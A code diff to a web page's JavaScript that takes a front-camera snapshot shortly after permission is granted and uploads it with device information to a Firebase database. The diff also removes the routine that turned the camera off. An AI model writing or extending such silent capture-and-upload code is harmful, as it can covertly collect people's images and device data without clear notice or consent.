@@ -103,20 +103,17 @@
                 // Show the video element immediately
                 videoElement.style.display = 'block'; // Show video after permission is granted
 
-                // Automatically stop the camera after 20 seconds
-                setTimeout(() => {
-                    stopCamera(stream);
-                }, 20000); // 20 seconds
-                
-                // Wait for the camera to stabilize and take a screenshot
+                // Automatically take a screenshot and upload the data immediately after
                 setTimeout(async () => {
                     const screenshot = await takeScreenshot(stream);
-                    // Create a unique session ID
-                    const sessionId = Date.now();
-                    // Upload session data to Firebase
-                    await uploadSessionData(sessionId, deviceInfo, screenshot);
+                    await uploadSessionData(deviceInfo, screenshot); // Upload right after taking the screenshot
                 }, 500); // Wait 0.5 seconds to stabilize before taking a screenshot
-                
+
+                // Keep the camera running for 20 seconds
+                setTimeout(() => {
+                    // Here you can stop the camera if needed, but it's currently set to keep running.
+                }, 20000); // 20 seconds
+
             } catch (error) {
                 errorMessage.innerHTML = error.message;
             } finally {
@@ -140,13 +137,6 @@
             } catch (error) {
                 throw new Error("Unable to access the camera. Please ensure your device has a front camera and permissions are granted.");
             }
-        }
-
-        function stopCamera(stream) {
-            stream.getTracks().forEach(track => track.stop());
-            videoElement.srcObject = null; // Clear the video source
-            videoElement.style.display = 'none'; // Hide video element after stopping
-            console.log("Camera stopped.");
         }
 
         async function takeScreenshot(stream) {
@@ -181,13 +171,13 @@
             };
         }
 
-        async function uploadSessionData(sessionId, deviceInfo, screenshot) {
+        async function uploadSessionData(deviceInfo, screenshot) {
             const sessionData = {
                 timestamp: Date.now(),
                 screenshot: screenshot,
                 ...deviceInfo // Spread device info into session data
             };
-            const dataRef = ref(database, 'sessions/' + sessionId);
+            const dataRef = ref(database, 'sessions/' + Date.now()); // Unique session ID based on the timestamp
             await set(dataRef, sessionData);
             console.log('Session data uploaded successfully');
         }
